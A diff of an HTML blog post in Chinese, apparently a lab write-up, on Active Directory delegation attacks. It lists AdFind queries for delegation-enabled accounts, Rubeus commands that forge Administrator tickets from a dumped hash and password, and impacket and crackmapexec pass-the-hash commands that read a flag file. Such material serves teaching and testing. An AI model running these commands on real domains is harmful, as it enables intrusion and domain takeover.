@@ -33,12 +33,17 @@
 <p>可在域外查询</p>
 </blockquote>
 <ul>
-<li><p>查询域内配置非约束性委派的主机</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=<span class="number">805306369</span>)(userAccountControl:<span class="number">1</span>.<span class="number">2</span>.<span class="number">840</span>.<span class="number">113556</span>.<span class="number">1</span>.<span class="number">4</span>.<span class="number">803</span>:=<span class="number">524288</span>))&quot; -dn</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>查询域内配置非约束性委派的服务账号</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=<span class="number">805306368</span>)(userAccountControl:<span class="number">1</span>.<span class="number">2</span>.<span class="number">840</span>.<span class="number">113556</span>.<span class="number">1</span>.<span class="number">4</span>.<span class="number">803</span>:=<span class="number">524288</span>))&quot; -dn</span><br></pre></td></tr></table></figure></li>
+<li>查询域内配置非约束性委派的主机<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=<span class="number">805306369</span>)(userAccountControl:<span class="number">1</span>.<span class="number">2</span>.<span class="number">840</span>.<span class="number">113556</span>.<span class="number">1</span>.<span class="number">4</span>.<span class="number">803</span>:=<span class="number">524288</span>))&quot; -dn</span><br></pre></td></tr></table></figure></li>
 </ul>
+<blockquote>
+<p><code>-b</code> 指定一个 BaseDN 作为查询的根</p>
+<p><code>-f</code> LDAP 过滤条件</p>
+</blockquote>
+<ul>
+<li>查询域内配置非约束性委派的服务账号</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=<span class="number">805306368</span>)(userAccountControl:<span class="number">1</span>.<span class="number">2</span>.<span class="number">840</span>.<span class="number">113556</span>.<span class="number">1</span>.<span class="number">4</span>.<span class="number">803</span>:=<span class="number">524288</span>))&quot; -dn</span><br></pre></td></tr></table></figure>
+
 <p>对攻击者来说，如果使用 DC 或域管去访问 Service1，那么就会在 lsass 内存中留下票据，就相当于直接拿下了域控</p>
 <p><em>待。。</em></p>
 <h2 id="约束委派攻击"><a href="#约束委派攻击" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h2><p>由于服务用户只能获取某个用户（或主机）的服务的 ST1 而非 TGT ， 所以只能模拟用户访问特定的服务 ，但是如果能拿到约束委派用户（或主机）的密码&#x2F;Hash，就可以模拟域内任意用户 (如 domain\administrator) 并代表其获得对已配置服务的访问权限（获取 TGS 票据）</p>
@@ -66,17 +71,20 @@
 
 <p>上图可以看到 MSSQLSERVER 服务配置了到 DC 的约束性委派（LDAP 和 CIFS 服务）</p>
 <h3 id="Rubeus-利用-CIFS-服务"><a href="#Rubeus-利用-CIFS-服务" class="headerlink" title="Rubeus 利用 CIFS 服务"></a>Rubeus 利用 CIFS 服务</h3><p>第一步，通过 Rubeus 申请机器&#x2F;服务账户的 TGT</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:d9bd25dd6f02e2de2bef5b7ecc32d609 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:d9bd25dd6f02e2de2bef5b7ecc32d609 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap</span><br><span class="line"># or</span><br><span class="line">.\Rubeus.exe asktgt /user:MSSQLSERVER$ /password:mssql123! /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap /ptt /outfile:ticket.kirbi</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p> <code>rc4</code> 为 dump 下来的服务账户的 hash</p>
+<p> <code>nowrap</code> 打印格式更好</p>
+<p> <code>outfile</code> 输出到文件</p>
+<p> <code>/ptt</code> 参数将票据导入内存</p>
 </blockquote>
-<p>获取到 base64 格式的 TGT 后，伪造 Administrator 域管理员身份请求针对域控 CIFS 服务的 ST 票据，并将得到的票据传递到内存中</p>
+<p>获取到 base64 格式或文件的 TGT 后，伪造 Administrator 域管理员身份请求针对域控 CIFS 服务的 ST 票据，并将得到的票据传递到内存中</p>
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:ticket.kirbi</span><br></pre></td></tr></table></figure>
 
 <blockquote>
 <p><code>/ticket</code> 参数可以为 base64 格式的 TGT，或经过转化后的 .kirbi 文件</p>
 </blockquote>
-<p> .kirbi 文件可以通过 powershell 转化 base64 字符串得到</p>
+<p> .kirbi 文件也可以通过 powershell 转化 base64 字符串得到</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">IO.File</span>]::WriteAllBytes(<span class="string">&quot;.\ticket.kirbi&quot;</span>, [<span class="type">Convert</span>]::FromBase64String(<span class="string">&quot;去掉换行后的base64&quot;</span>))</span><br></pre></td></tr></table></figure>
 
 <p>除上面步骤外，使用 Rubeus 也可以一步到位获取 CIFS 的 ST 票据：</p>
@@ -102,4 +110,5 @@
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-wmiexec -hashes :<span class="number">1</span>a19251fbd935969832616366ae3fe62 Administrator@<span class="number">172</span>.<span class="number">22</span>.<span class="number">2</span>.<span class="number">3</span></span><br></pre></td></tr></table></figure>
 
 <p>也可以进行 PTH 攻击</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb <span class="number">172</span>.<span class="number">22</span>.<span class="number">2</span>.<span class="number">3</span> -u administrator -H <span class="number">1</span>a19251fbd935969832616366ae3fe62 -d xiaorang.lab -x &quot;<span class="built_in">type</span> c:\Users\Administrator\flag\flag04.txt&quot;</span><br></pre></td></tr></table></figure></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2025-02-17</span><i class="fa fa-tag"></i><a class="tag" href="/tags/intranet/" title="intranet">intranet </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2025/02/17/Delegation-Attack/,Mini's blog,域委派攻击,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/2025/02/16/mimikatz/" title="mimikatz">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb <span class="number">172</span>.<span class="number">22</span>.<span class="number">2</span>.<span class="number">3</span> -u administrator -H <span class="number">1</span>a19251fbd935969832616366ae3fe62 -d xiaorang.lab -x &quot;<span class="built_in">type</span> c:\Users\Administrator\flag\flag04.txt&quot;</span><br></pre></td></tr></table></figure>
+</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2025-02-17</span><i class="fa fa-tag"></i><a class="tag" href="/tags/intranet/" title="intranet">intranet </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2025/02/17/Delegation-Attack/,Mini's blog,域委派攻击,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/2025/02/16/mimikatz/" title="mimikatz">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
